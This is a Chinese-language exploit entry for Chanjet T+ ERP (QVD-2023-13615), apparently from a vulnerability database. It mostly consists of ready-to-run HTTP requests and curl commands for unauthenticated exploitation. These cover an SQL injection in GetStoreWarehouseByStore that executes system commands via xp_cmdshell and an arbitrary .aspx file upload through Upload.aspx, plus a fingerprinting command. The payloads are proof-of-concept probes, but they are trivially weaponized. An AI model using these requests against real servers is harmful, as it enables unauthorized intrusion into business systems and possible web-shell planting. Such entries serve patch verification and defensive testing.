---
id: CHANJET-TPLUS-RCE
title: 畅捷通 T+ SQL注入/文件上传 RCE (QVD-2023-13615)
product: yongyou
vendor: 畅捷通
version_affected: "T+"
severity: CRITICAL
tags: [rce, sqli, file_upload, 无需认证, 国产, erp]
fingerprint: ["畅捷通", "chanjet", "T+", "/tplus/", "ajaxpro"]
---

## 漏洞描述

畅捷通 T+ 的 GetStoreWarehouseByStore 接口存在 SQL 注入漏洞（QVD-2023-13615），可通过 xp_cmdshell 执行系统命令。同时 Upload.aspx 存在任意文件上传。

## 影响版本

- 畅捷通 T+

## 前置条件

- 无需认证
- SQL注入方式需目标 MSSQL 开启 xp_cmdshell

## 利用步骤

### SQL注入 RCE (QVD-2023-13615)

```http
POST /tplus/ajaxpro/Ufida.T.CodeBehind.UIP.NewMasterPage,App_Web_newmasterpage.aspx.cdcab7d2.ashx HTTP/1.1
Host: target
Content-Type: text/plain
AjaxPro-Method: DownloadKDReport

{"jsonData":"{\"ObjectName\":\"GetStoreWarehouseByStore\",\"Parameters\":{\"storeID\":\"1;exec master..xp_cmdshell 'whoami'--\"}}"}
```

### 任意文件上传

```http
POST /tplus/SM/SetupAccount/Upload.aspx?preload=1 HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="test.aspx"
Content-Type: application/octet-stream

<%@ Page Language="C#" %><%Response.Write("vuln_test");%>
------WebKitFormBoundary--
```

## Payload

### SQL注入 RCE

```bash
curl -s -X POST "http://target/tplus/ajaxpro/Ufida.T.CodeBehind.UIP.NewMasterPage,App_Web_newmasterpage.aspx.cdcab7d2.ashx" \
  -H "Content-Type: text/plain" \
  -H "AjaxPro-Method: DownloadKDReport" \
  -d '{"jsonData":"{\"ObjectName\":\"GetStoreWarehouseByStore\",\"Parameters\":{\"storeID\":\"1;exec master..xp_cmdshell '\''whoami'\''--\"}}"}'
```

### 任意文件上传

```bash
curl -s -X POST "http://target/tplus/SM/SetupAccount/Upload.aspx?preload=1" \
  -F 'file=@test.aspx;type=application/octet-stream'
```

## 验证方法

SQL 注入响应包含命令执行结果；文件上传后访问确认。

## 指纹确认

```bash
curl -s -o /dev/null -w "%{http_code}" "http://target/tplus/"
```
